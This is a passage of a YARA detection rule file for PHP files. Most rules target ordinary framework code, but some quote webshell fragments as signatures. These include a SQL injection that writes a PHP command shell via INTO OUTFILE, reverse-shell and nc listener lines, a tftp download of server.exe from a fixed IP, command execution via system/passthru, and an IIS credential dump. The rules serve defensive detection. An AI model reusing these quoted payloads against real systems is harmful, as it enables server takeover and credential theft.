      hash1 = "db61a283e4d8c516890675f826a6a96a4f33af0462bccc790891a5a09b10c5f4"
   strings:
      $x1 = "*  <li>{@link http://partners.adobe.com/public/developer/opentype/index_spec.html}" fullword ascii
      $s2 = "*  <li>{@link http://www.microsoft.com/typography/OTSPEC/}" fullword ascii
      $s3 = "*  <li>{@link http://developer.apple.com/textfonts/TTRefMan/}" fullword ascii
      $s4 = "* Reads the fixed 16.16 table version number and checks for compatibility." fullword ascii
      $s5 = "* the font. There may be additional usage rights granted or denied" fullword ascii
      $s6 = "* and Macintosh Roman. For very complex fonts, there may also be mappings" fullword ascii
      $s7 = "* will prevail since it is processed last." fullword ascii
      $s8 = "* extract either TrueType or PostScript font data from the file." fullword ascii
      $s9 = "* PostScript names which we don't use, move on. (This may change at" fullword ascii
      $s10 = "$this->_debugLog('Unsupported encoding: platformID: %d; encodingID: %d; skipping'," fullword ascii
      $s11 = "$this->_debugLog('Skipping languageID: 0x%x; platformID %d', $languageID, $platformID);" fullword ascii
      $s12 = "$this->_debugLog('Adding nameID: %d; languageID: 0x%x; platformID: %d; offset: 0x%x (0x%x); length: %d'," fullword ascii
      $s13 = "*   http://www.microsoft.com/globaldev/reference/lcid-all.mspx" fullword ascii
      $s14 = "* Parses the OpenType post (PostScript Information) table." fullword ascii
      $s15 = "$this->_debugLog('Warning: cmap tables must be language-independent - this font'" fullword ascii
      $s16 = "* If the version is incompatible, throws an exception. If it is compatible," fullword ascii
      $s17 = "*   http://www.microsoft.com/OpenType/OTSpec/ibmfc.htm" fullword ascii
      $s18 = "/* Skip over PostScript virtual memory usage." fullword ascii
      $s19 = "* @todo Need to rework the selection logic for picking a subtable. We should" fullword ascii
      $s20 = "* for Macintosh fonts, so may not always be present. When available, we use" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule ProductFormMenuBuilder
{
   meta:
      description = "php22 - file ProductFormMenuBuilder.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ad13c4a80bede58e794c96200165805861488204c81a71720b7cce35733a8f10"
   strings:
      $s1 = "->setAttribute('template', '@SyliusAdmin/Product/Tab/_associations.html.twig')" fullword ascii
      $s2 = "->setAttribute('template', '@SyliusAdmin/Product/Tab/_details.html.twig')" fullword ascii
      $s3 = "->setAttribute('template', '@SyliusAdmin/Product/Tab/_taxonomy.html.twig')" fullword ascii
      $s4 = "->setAttribute('template', '@SyliusAdmin/Product/Tab/_attributes.html.twig')" fullword ascii
      $s5 = "if (!array_key_exists('product', $options) || !$options['product'] instanceof ProductInterface) {" fullword ascii
      $s6 = "->setAttribute('template', '@SyliusAdmin/Product/Tab/_media.html.twig')" fullword ascii
      $s7 = "* @param EventDispatcherInterface $eventDispatcher" fullword ascii
      $s8 = "public function __construct(FactoryInterface $factory, EventDispatcherInterface $eventDispatcher)" fullword ascii
      $s9 = "* @param FactoryInterface $factory" fullword ascii
      $s10 = "use Symfony\\Component\\EventDispatcher\\EventDispatcherInterface;" fullword ascii
      $s11 = "* @var EventDispatcherInterface" fullword ascii
      $s12 = "* @return ItemInterface" fullword ascii
      $s13 = "* @var FactoryInterface" fullword ascii
      $s14 = "use Sylius\\Component\\Core\\Model\\ProductInterface;" fullword ascii
      $s15 = "use Sylius\\Bundle\\AdminBundle\\Event\\ProductMenuBuilderEvent;" fullword ascii
      $s16 = "new ProductMenuBuilderEvent($this->factory, $menu, $options['product'])" fullword ascii
      $s17 = "$menu = $this->factory->createItem('root');" fullword ascii
      $s18 = "public function createMenu(array $options = []): ItemInterface" fullword ascii
      $s19 = "public const EVENT_NAME = 'sylius.menu.admin.product.form';" fullword ascii
      $s20 = "private $eventDispatcher;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 7KB and
      8 of them
}

rule PaymentGatewayChoiceType
{
   meta:
      description = "php22 - file PaymentGatewayChoiceType.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e940ff67f16841f0fb833054af728e2acee38c0e2887729668bbfe29e1ec54a4"
   strings:
      $s1 = "public function configureOptions(OptionsResolver $resolver): void" fullword ascii
      $s2 = "use Symfony\\Component\\Form\\Extension\\Core\\Type\\ChoiceType;" fullword ascii
      $s3 = "* @param array $gateways" fullword ascii
      $s4 = "use Symfony\\Component\\OptionsResolver\\OptionsResolver;" fullword ascii
      $s5 = "public function getBlockPrefix(): string" fullword ascii
      $s6 = "public function getParent(): string" fullword ascii
      $s7 = "use Symfony\\Component\\Form\\AbstractType;" fullword ascii
      $s8 = "namespace Sylius\\Bundle\\PaymentBundle\\Form\\Type;" fullword ascii
      $s9 = "'choices' => array_flip($this->gateways)," fullword ascii
      $s10 = "public function __construct(array $gateways)" fullword ascii
      $s11 = "private $gateways;" fullword ascii
      $s12 = "return 'sylius_payment_gateway_choice';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule PreAuthenticatedAdminSessionListener
{
   meta:
      description = "php22 - file PreAuthenticatedAdminSessionListener.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "252ce4e3d58210302991c9d8a9a2d3f7c86038e86b28e54eac699be8bee2f823"
   strings:
      $s1 = "use Symfony\\Component\\HttpKernel\\Event\\GetResponseEvent;" fullword ascii
      $s2 = "* Checks if there's an existing admin session and stores its token on the security token storage." fullword ascii
      $s3 = "if ($storedToken instanceof PreAuthenticatedAdminToken && $storedToken->getProviderKey() === $this->providerKey) {" fullword ascii
      $s4 = "if ($storedToken instanceof PreAuthenticatedAdminToken && $storedToken->getProviderKey() === $this->providerKey)" fullword ascii
      $s5 = "use Symfony\\Component\\Security\\Http\\Firewall\\ListenerInterface;" fullword ascii
      $s6 = "* @param TokenStorageInterface $tokenStorage" fullword ascii
      $s7 = "* @package Pimcore\\Bundle\\AdminBundle\\Security\\Firewall" fullword ascii
      $s8 = "* @param string $providerKey" fullword ascii
      $s9 = "* @param AuthenticationManagerInterface $authenticationManager" fullword ascii
      $s10 = "* @var TokenStorageInterface" fullword ascii
      $s11 = "$storedToken = $this->tokenStorage->getToken();" fullword ascii
      $s12 = "use Symfony\\Component\\Security\\Core\\Authentication\\Token\\Storage\\TokenStorageInterface;" fullword ascii
      $s13 = "$token->setUser($user->getUsername());" fullword ascii
      $s14 = "use Symfony\\Component\\Security\\Core\\Authentication\\AuthenticationManagerInterface;" fullword ascii
      $s15 = "use Symfony\\Component\\Security\\Core\\Exception\\AuthenticationException;" fullword ascii
      $s16 = "* @var AuthenticationManagerInterface" fullword ascii
      $s17 = "public function handle(GetResponseEvent $event)" fullword ascii
      $s18 = "class PreAuthenticatedAdminSessionListener implements ListenerInterface" fullword ascii
      $s19 = "use Pimcore\\Bundle\\AdminBundle\\Security\\Authentication\\Token\\PreAuthenticatedAdminToken;" fullword ascii
      $s20 = "$token = new PreAuthenticatedAdminToken($user, '', $this->providerKey);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 8KB and
      8 of them
}

rule pHpINJ_php
{
   meta:
      description = "php22 - file pHpINJ.php.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "15cbff9e8a35044ac078f447416b389efc05e151b856f78c1565bd620c8add33"
   strings:
      $x1 = "echo \"After clicking go to http://www.site.com/path2phpshell/shell.php?cpc=ls to see results\";" fullword ascii
      $s2 = "<input type = \"text\" name = \"outfile\" value = \"/var/www/localhost/htdocs/n13/shell.php\" size = \"50\"> <br /> <br />" fullword ascii
      $s3 = "<header>||   .::News PHP Shell Injection::.   ||</header> <br /> <br />" fullword ascii
      $s4 = "<input type = \"text\" name = \"url\" value = \"http://www.site.com/n13/index.php\"; size = \"50\"> <br />" fullword ascii
      $s5 = "<title>|| .::News Remote PHP Shell Injection::. ||   </title>" fullword ascii
      $s6 = "$sql = \"0' UNION SELECT '0' , '<?php system(\\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0 INTO OUTFILE '$outfile\";" fullword ascii
      $s7 = "Full server path to a writable file which will contain the Php Shell <br />" fullword ascii
      $s8 = "<form action = \"<?php echo \"$_SERVER[PHP_SELF]\" ; ?>\" method = \"post\">" fullword ascii
      $s9 = "<input type = \"submit\" value = \"Create Exploit\"> <br /> <br />" fullword ascii
      $s10 = "echo '<a href='.$expurl.'> Click Here to Exploit </a> <br />';" fullword ascii
      $s11 = "Server Path to Shell: <br />" fullword ascii
      $s12 = "$path2news = $_POST['path2news'];" fullword ascii
      $s13 = "if (isset($_POST['url'])) {" fullword ascii
      $s14 = "$outfile = $_POST ['outfile'];" fullword ascii
      $s15 = "$url = $_POST['url'];" fullword ascii
      $s16 = "Url to index.php: <br /> " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      1 of ($x*) and 4 of them
}

rule RenameFolderOnDisk
{
   meta:
      description = "php22 - file RenameFolderOnDisk.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "947681031e4ad8e7cfd9697654c38a0628b36bd73da1109f459bdfe9324961b1"
   strings:
      $s1 = "$this->filesystem->disk($this->getConfiguredFilesystem())" fullword ascii
      $s2 = "if ($this->getConfiguredFilesystem() === 'local') {" fullword ascii
      $s3 = "private function getConfiguredFilesystem()" fullword ascii
      $s4 = "$this->getDestinationPath($event->previousFolderData['path']->getRelativeUrl())," fullword ascii
      $s5 = "$this->getDestinationPath($event->folder->path->getRelativeUrl())" fullword ascii
      $s6 = "$previousPath = $event->previousFolderData['path']->getRelativeUrl();" fullword ascii
      $s7 = "private function getDestinationPath($path)" fullword ascii
      $s8 = "private function replacePathReferences($folderId, $previousPath, $newPath)" fullword ascii
      $s9 = "return config('asgard.media.config.filesystem');" fullword ascii
      $s10 = "public function __construct(Factory $filesystem, FileRepository $file)" fullword ascii
      $s11 = "$newPath = $event->folder->path->getRelativeUrl();" fullword ascii
      $s12 = "private function renameDatabaseReferences(FolderWasUpdated $event)" fullword ascii
      $s13 = "$oldPath = $media->path->getRelativeUrl();" fullword ascii
      $s14 = "* @var FileRepository" fullword ascii
      $s15 = "$this->replacePathReferences($event->folder->id, $previousPath, $newPath);" fullword ascii
      $s16 = "* @var Factory" fullword ascii
      $s17 = "$this->replacePathReferences($media->id, $previousPath, $newPath);" fullword ascii
      $s18 = "use Illuminate\\Contracts\\Filesystem\\Factory;" fullword ascii
      $s19 = "$this->filesystem = $filesystem;" fullword ascii
      $s20 = "'path' => str_replace($previousPath, $newPath, $oldPath)," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      8 of them
}

rule OrderAdjustmentsClearerSpec
{
   meta:
      description = "php22 - file OrderAdjustmentsClearerSpec.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5f3c719fbfc8379f6e67a6e8893bf4f229c4682552591c5509d6b7144b3425c5"
   strings:
      $s1 = "use Sylius\\Component\\Order\\Processor\\OrderProcessorInterface;" fullword ascii
      $s2 = "namespace spec\\Sylius\\Component\\Core\\OrderProcessing;" fullword ascii
      $s3 = "function it_is_an_order_processor(): void" fullword ascii
      $s4 = "$this->process($order);" fullword ascii
      $s5 = "$this->shouldImplement(OrderProcessorInterface::class);" fullword ascii
      $s6 = "$order->removeAdjustmentsRecursively(AdjustmentInterface::ORDER_SHIPPING_PROMOTION_ADJUSTMENT)->shouldBeCalled();" fullword ascii
      $s7 = "function it_removes_adjustments_from_order_recursively(OrderInterface $order): void" fullword ascii
      $s8 = "use Sylius\\Component\\Core\\Model\\AdjustmentInterface;" fullword ascii
      $s9 = "$order->removeAdjustmentsRecursively(AdjustmentInterface::ORDER_PROMOTION_ADJUSTMENT)->shouldBeCalled();" fullword ascii
      $s10 = "$order->removeAdjustmentsRecursively(AdjustmentInterface::ORDER_UNIT_PROMOTION_ADJUSTMENT)->shouldBeCalled();" fullword ascii
      $s11 = "$order->removeAdjustmentsRecursively(AdjustmentInterface::ORDER_ITEM_PROMOTION_ADJUSTMENT)->shouldBeCalled();" fullword ascii
      $s12 = "$order->removeAdjustmentsRecursively(AdjustmentInterface::TAX_ADJUSTMENT)->shouldBeCalled();" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule RepositoryTest
{
   meta:
      description = "php22 - file RepositoryTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "099a4fa169cd4e111d388137cf558716add928b8cb42cc218a660a62eb4190f2"
   strings:
      $s1 = "* (c) Daniel Leech <daniel@dantleech.com>" fullword ascii
      $s2 = "* It should delete a specified run and all of its relations." fullword ascii
      $s3 = "use PhpBench\\Extensions\\Dbal\\Storage\\Driver\\Dbal\\Visitor\\TokenValueVisitor;" fullword ascii
      $s4 = "* It should get parameters." fullword ascii
      $s5 = "$latestUuid = $this->repository->getLatestRunUuid();" fullword ascii
      $s6 = "* It should retrieve the latest suite UUID." fullword ascii
      $s7 = "$count = $conn->query('SELECT COUNT(*) FROM ' . $table->getName());" fullword ascii
      $s8 = "* It should return the history statement." fullword ascii
      $s9 = "* This file is part of the PHPBench package" fullword ascii
      $s10 = "private function getTableCounts()" fullword ascii
      $s11 = "namespace PhpBench\\Extensions\\Dbal\\Tests\\Functional\\Storage\\Driver\\Dbal;" fullword ascii
      $s12 = "$conn = $this->getConnection();" fullword ascii
      $s13 = "use PhpBench\\Extensions\\Dbal\\Storage\\Driver\\Dbal\\Repository;" fullword ascii
      $s14 = "use PhpBench\\Extensions\\Dbal\\Storage\\Driver\\Dbal\\Persister;" fullword ascii
      $s15 = "$this->repository = new Repository($manager, $tokenVisitor->reveal());" fullword ascii
      $s16 = "$statement = $this->repository->getHistoryStatement();" fullword ascii
      $s17 = "* It can determine if run exists." fullword ascii
      $s18 = "foreach ($schema->getTables() as $table) {" fullword ascii
      $s19 = "use PhpBench\\Extensions\\Dbal\\Storage\\Driver\\Dbal\\Schema;" fullword ascii
      $s20 = "$params = $this->repository->getParameters(1);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule php22_phpda
{
   meta:
      description = "php22 - file phpda.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4eac42ac87e26d48fe8c1f673c274eb84b4c207d5a4f84eaa475f3118afbf917"
   strings:
      $x1 = "echo Exec_Run('/tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : '" fullword ascii
      $x2 = "$exe = @$shell->exec(\"cmd.exe /c \".$cmd);" fullword ascii
      $x3 = "Str[8] = \"tftp -i 219.134.46.245 get server.exe c:\\\\\\\\server.exe\";" fullword ascii
      $x4 = "Str[6] = \"tftp -i 219.134.46.245 get server.exe c:\\\\server.exe\";" fullword ascii
      $x5 = "$run = isset($_POST['run']) ? $_POST['run'] : 'cmd.exe';" fullword ascii
      $x6 = "if(md5($_POST['spiderpass']) == md5($password)){die('<meta http-equiv=\"refresh\" content=\"1;URL=?\">');}" fullword ascii
      $x7 = "<input type=\"text\" name=\"tcb\" id=\"tcb\" value=\"http://www.baidu.com/download/muma.exe\" style=\"width:500px;\">';" fullword ascii
      $x8 = "if(!empty($_POST['cmd'])){$res = Exec_Run($_POST['cmd']);$cmd = $_POST['cmd'];}" fullword ascii
      $x9 = "elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$res = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $x10 = "$query = \"INSERT into Spider_Temp_Tab values (CONVERT(\".$shellcode.\",CHAR));\";" fullword ascii
      $x11 = "echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] " ascii
      $x12 = "echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] " ascii
      $x13 = "$res = Exec_Run('gcc -o /tmp/angel_bc /tmp/angel_bc.c');" fullword ascii
      $x14 = "elseif(function_exists('system')){@ob_start();@system($cmd);$res = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $x15 = "$adduser = \"-SETUSERSETUP\\r\\n\".\"-IP=0.0.0.0\\r\\n\".\"-PortNo=21\\r\\n\".\"-User=\".$_POST['user'].\"\\r\\n\".\"-Password=" ascii
      $x16 = ": &lt;script language=javascript src=\"http://www.baidu.com/ad.js?EMTDSU\"&gt;&lt;/script&gt;</div></div>" fullword ascii
      $x17 = "<div class=\"topbg\"> &nbsp; {$Server_IP} - {$Server_OS} - <a href=\"{$Server_Alexa}\" target=\"_blank\">Alexa</a></div>" fullword ascii
      $x18 = "$Com_durl = isset($_POST['durl']) ? $_POST['durl'] : 'http://www.baidu.com/down/muma.exe';" fullword ascii
      $x19 = "$cmd = isset($_POST['cmd']) ? $_POST['cmd'] : 'copy c:\\windows\\php.ini c:\\php.ini';" fullword ascii
      $x20 = "if(isset($_POST['mhost']) && isset($_POST['mport']) && isset($_POST['muser']) && isset($_POST['mpass']))" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*)
}

rule ObjectStateToken
{
   meta:
      description = "php22 - file ObjectStateToken.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d504f6e34f1cfdcbfa4afc54c1089fb8bc974845d2c23fc60078ae4f381d1629"
   strings:
      $s1 = "* @author Konstantin Kudryashov <ever.zet@gmail.com>" fullword ascii
      $s2 = "* (c) Konstantin Kudryashov <ever.zet@gmail.com>" fullword ascii
      $s3 = "$this->comparatorFactory = $comparatorFactory ?: ComparatorFactory::getInstance();" fullword ascii
      $s4 = "*     Marcello Duarte <marcello.duarte@gmail.com>" fullword ascii
      $s5 = "* @param ComparatorFactory $comparatorFactory" fullword ascii
      $s6 = "* Scores 8 if argument is an object, which method returns expected value." fullword ascii
      $s7 = "* Returns string representation for token." fullword ascii
      $s8 = "$comparator = $this->comparatorFactory->getComparatorFor(" fullword ascii
      $s9 = "* Object state-checker token." fullword ascii
      $s10 = "* Initializes token." fullword ascii
      $s11 = "use SebastianBergmann\\Comparator\\ComparisonFailure;" fullword ascii
      $s12 = "* This file is part of the Prophecy." fullword ascii
      $s13 = "use Prophecy\\Comparator\\Factory as ComparatorFactory;" fullword ascii
      $s14 = "* @param mixed             $value             Expected return value" fullword ascii
      $s15 = "* @param mixed $argument" fullword ascii
      $s16 = "* @return bool|int" fullword ascii
      $s17 = "$comparator->assertEquals($this->value, $actual);" fullword ascii
      $s18 = "ComparatorFactory $comparatorFactory = null" fullword ascii
      $s19 = "if (is_object($argument) && method_exists($argument, $this->name)) {" fullword ascii
      $s20 = "if (is_object($argument) && property_exists($argument, $this->name)) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 7KB and
      8 of them
}

rule output_data
{
   meta:
      description = "php22 - file output_data.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a45cfc31b413ad062677f6b47721e750ada94f40156e10c9beb630d45721b398"
   strings:
      $s1 = "count(get_included_files()) - 1" fullword ascii
      $s2 = "microtime(true) - $_SERVER['REQUEST_TIME_FLOAT']," fullword ascii
      $s3 = "memory_get_peak_usage()," fullword ascii
      $s4 = "\"\\n%' 8d:%f:%d\"," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule RelationshipObjectInterface
{
   meta:
      description = "php22 - file RelationshipObjectInterface.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "779fd91742de484b020475e2991c6cad6bdafba1e56758ec015b49ecdf24de72"
   strings:
      $s1 = "* Copyright 2015-2018 info@neomerx.com" fullword ascii
      $s2 = "* Get link name (null for root)." fullword ascii
      $s3 = "* http://www.apache.org/licenses/LICENSE-2.0" fullword ascii
      $s4 = "* If relationship is from root (non existing root element)." fullword ascii
      $s5 = "* @return array<string,\\Neomerx\\JsonApi\\Contracts\\Schema\\LinkInterface>" fullword ascii
      $s6 = "* Get resource data from relationship." fullword ascii
      $s7 = "* Get links." fullword ascii
      $s8 = "* Get meta." fullword ascii
      $s9 = "* @package Neomerx\\JsonApi" fullword ascii
      $s10 = "* If 'data' should be shown." fullword ascii
      $s11 = "* @return object|array|null" fullword ascii
      $s12 = "public function getLinks(): array;" fullword ascii
      $s13 = "public function getName(): ?string;" fullword ascii
      $s14 = "public function getData();" fullword ascii
      $s15 = "public function getMeta();" fullword ascii
      $s16 = "<?php namespace Neomerx\\JsonApi\\Contracts\\Schema;" fullword ascii
      $s17 = "public function isRoot(): bool;" fullword ascii
      $s18 = "public function isShowData(): bool;" fullword ascii
      $s19 = "interface RelationshipObjectInterface" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule ProductAssociationFixtureTest
{
   meta:
      description = "php22 - file ProductAssociationFixtureTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "07ca03326a6d0d12c40abc2fcebacbb1ba1f0236eeed6abf97998dcfdeec297e"
   strings:
      $s1 = "protected function getConfiguration(): ProductAssociationFixture" fullword ascii
      $s2 = "$this->assertPartialConfigurationIsInvalid([['random' => -1]], 'random');" fullword ascii
      $s3 = "$this->assertConfigurationIsValid([['custom' => [['owner' => 'product']]]], 'custom.*.owner');" fullword ascii
      $s4 = "$this->assertConfigurationIsValid([['custom' => [['type' => 'type']]]], 'custom.*.type');" fullword ascii
      $s5 = "$this->assertConfigurationIsValid([['random' => 4]], 'random');" fullword ascii
      $s6 = "$this->getMockBuilder(ExampleFactoryInterface::class)->getMock()" fullword ascii
      $s7 = "$this->assertConfigurationIsValid([[]], 'custom');" fullword ascii
      $s8 = "public function product_association_associated_products_are_optional(): void" fullword ascii
      $s9 = "use Doctrine\\Common\\Persistence\\ObjectManager;" fullword ascii
      $s10 = "use Sylius\\Bundle\\CoreBundle\\Fixture\\Factory\\ExampleFactoryInterface;" fullword ascii
      $s11 = "final class ProductAssociationFixtureTest extends \\PHPUnit_Framework_TestCase" fullword ascii
      $s12 = "use Sylius\\Bundle\\CoreBundle\\Fixture\\ProductAssociationFixture;" fullword ascii
      $s13 = "'custom' => [['associated_products' => ['product-1', 'product-2']]]," fullword ascii
      $s14 = "$this->assertConfigurationIsValid(" fullword ascii
      $s15 = "$this->getMockBuilder(ObjectManager::class)->getMock()," fullword ascii
      $s16 = "public function product_association_owner_is_optional(): void" fullword ascii
      $s17 = "public function product_assoiations_are_optional(): void" fullword ascii
      $s18 = "public function product_association_type_is_optional(): void" fullword ascii
      $s19 = "use Matthias\\SymfonyConfigTest\\PhpUnit\\ConfigurationTestCaseTrait;" fullword ascii
      $s20 = "namespace Sylius\\Bundle\\CoreBundle\\Tests\\Fixture;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      8 of them
}

rule php22_phpiis
{
   meta:
      description = "php22 - file phpiis.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "30a61d85604280f50b2c7c0b306ac1983747e3d6f55caafdda594c5df768739f"
   strings:
      $s1 = "$webSite=new COM(\"IIS://localhost/w3svc/\".$obj3w->Name.'/Root');" fullword ascii
      $s2 = "$ObjService = new COM(\"IIS://localhost/w3svc\");" fullword ascii
      $s3 = "echo \"[HOST  ] \"  .$Binds.'</br>';" fullword ascii
      $s4 = "echo \"[USER  ] \" . $webSite->AnonymousUserName.'</br>';" fullword ascii
      $s5 = "echo \"[PASS  ] \" . $webSite->AnonymousUserPass.'</br>';" fullword ascii
      $s6 = "echo \"[NAME  ] \" .$obj3w->ServerComment.'</br>';" fullword ascii
      $s7 = "foreach ($obj3w->ServerBindings as $Binds){" fullword ascii
      $s8 = "echo \"[STATE ] running\".'</br>';" fullword ascii
      $s9 = "echo \"-------------------------------------------\".'</br>';" fullword ascii
      $s10 = "foreach ($ObjService as $obj3w) {" fullword ascii
      $s11 = "echo \"[PATH  ] \" . $webSite->path.'</br>';" fullword ascii
      $s12 = "$state=intval($obj3w->ServerState);" fullword ascii
      $s13 = "echo \"[STATE ] stoped\".'</br>';" fullword ascii
      $s14 = "echo \"[STATE ] paused\".'</br>';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule php22_3rror
{
   meta:
      description = "php22 - file 3rror.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d683609b023c6229a3962dfd376cc839ecbcd298e1483890647d0cba35b99fc1"
   strings:
      $s1 = "aDVJeGJ0Nlcvbm96aXVBUlBsY1hyL1BuUWc3b1hhSG9kVWgxcUk1eEN3aWpmdDllZUFKcTNyV3IrcHp" fullword ascii
      $s2 = "Obfuscation provided by FOPO - Free Online PHP Obfuscator: http://www.fopo.com.ar/" fullword ascii
      $s3 = "a1UyWDkrL2kxUEdMcDZyUjdWeVFqbEtyWHNMa3dUWURrMWk4NkEyeHkwNW5xTWhKcFdtWXZmeVp6SmZ" fullword ascii
      $s4 = "NHEyeGY0NC90WVZURlV0WGt1K2NQUG1jWDhkUnN6SmxJTlBiNWduc2d2ekpKbTdZRmpuVHVXODdsdml" fullword ascii
      $s5 = "T21WVWZvM1JhZUNsdllIVWQzTE5vbGlyUFhTczZPM21XaWdaS3dldEhTL0U2RUN0cm9DcnNGK2J5bEk" fullword ascii
      $s6 = "dkEyWTJNOHJSbDZLQldaczVDQTlEcmRuNVBITndMS3NYYnNXRkF5bk10eXRsN1lzZ3Znd2hJMUxxN2h" fullword ascii
      $s7 = "YnZmdE9BeitpOTNKbTF3TmVoTmp1K1dNd0ZhVjRLNm5DZ1JBTEMrcGJiUjZwRUNGRnd0cjdrYTZQUyt" fullword ascii
      $s8 = "TjNjUW9WRUNhWGlrTmpieU5wZjRvd05nODhOQ1kySW8rT1VEU0hkaVpDY0J0MjE5N0xLS3lCK1AzMzV" fullword ascii
      $s9 = "c0dhbDllL2dUTkZKbVMwYjl0Z0k5WGVvaWQ2dk5tRmdSYlB0YVpNamxrR3B5MDJrYkNHSmVNbzVGZjd" fullword ascii
      $s10 = "Vnl2OXBDNmVRWlQxaXZxbHE1Wk43bVc0TjRqWktvSFlRSjNBalRkS290bDJFd3BPWHdqZDlLNWovdDd" fullword ascii
      $s11 = "NlJxaCtmS091cEhPMjlrSzVzNnNxOE1aWXJINWl4d0Z2dUNyalJ6c0ZGeTZ3R1ZXRzkrY3VrSjUxRnd" fullword ascii
      $s12 = "Z0Ribi8xQXcwWnhYeHFqenVHelZ1VDNUVUlBS0Rka0JWM3gyVGtJUzVtdklRdllWTEhVOEFUODk4ckg" fullword ascii
      $s13 = "dWhydjlMTU1YaWFwbDlLbkJjWmIzSHFocUUxbVZldG02YzdJZ21ZYXJRNU1MQXl1eW5Nc20vVzdXZEs" fullword ascii
      $s14 = "QmdvNzZESGJ1bVU2UnlUdllsS0RjdFYzaTJtQzZZc2JYSkljRytuZ0tIK1E2YWw0WUxoMWsxZEtUSi9" fullword ascii
      $s15 = "WEZXQVh0MEF5SU8rQUVnU1Z1b21VQTV2THJPOStzOWsrU1ovYlViM2xXQnV5YVFOTEVMMnVrck9YYnV" fullword ascii
      $s16 = "NmZldll0Z3o5dklWeS9KT3NmUSt5VFdNUk9TRHRQVUl1SUhzUXNMSllrMWhBR1h0Yit2akhKdFZYcXN" fullword ascii
      $s17 = "Y3h0Z2VqeDJsUXdWYkhVNitOdnlzcW9BMmpLOGpsMXluOVN4U1pCWm9VOVRJM1FtUUlQd3gxY2NDT2Z" fullword ascii
      $s18 = "OEdUYVFxYWYvU2ZlOGVwNXdtcWFlaENzamQ3Skx4ZWxsSzBKYmJENHZlKyswTGZmRGNEdVNJNmlKY01" fullword ascii
      $s19 = "NERtVkg3N3RwTUhndllTc3p1QUN4RHBJc0pheGJVTHdtQVNKN1kvQ2NOZW9WbFowY1hxbDBUVGw3SUR" fullword ascii
      $s20 = "Z1lvbTBaei9lL1RrRll3VEpPY2xpdllzSFZwQjVsRzJUU1gvN1VBR2VsdjFhdVJGQ28wekRYaVgxc1o" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4000KB and
      8 of them
}

rule onlineexpnokill
{
   meta:
      description = "php22 - file onlineexpnokill.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "09e233736cc15529fb8e0c711ef3adba86da6eeb8a298790af57f9701a2d9a67"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s3 = "$myurl='http://www.zxexp.com';//" fullword ascii
      $s4 = "header(\"content-Type: text/html; charset=utf-8\");" fullword ascii
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD" ascii
      $s6 = "AAAAAAAAAAD" ascii
      $s7 = "AAAAAAAAAAAC" ascii
      $s8 = "Q8N35HZ2XAJ0KAg1pLX+y41Zembpb6llhZxVvaFHgdmo4xzQs7xmOwleZ7YuiNxCTEMPeVw9jawN3ucO3Wk3nHGLptbn55frYU5xsqdIo84fMnev7uevZ8rsXXiqD3xo" ascii
      $s9 = "BhB3fXkr+Y59pxVNIPsiQuGZcbE2Of4LTQD9Df4YHD+p5whrU7nUWrl2vtxlPx88oJw0/EZZ+Jb8+X3ckY88x3gDQ27Ehys3hr2b2//oI7P0c/KnBo4cvYIPCc7NNcPH" ascii
      $s10 = "fG0nJrspX2Nz8n3EIMm7rYXds3aLdW9hjlznIn9Mr3XUc5opPeYedf0Lqg5//z+7DjXufvUUODFqaEHXlyr+QPkF472f2gkmY8IJhz271Y9TxBbQ0yVO42v1odz3mNb6" ascii
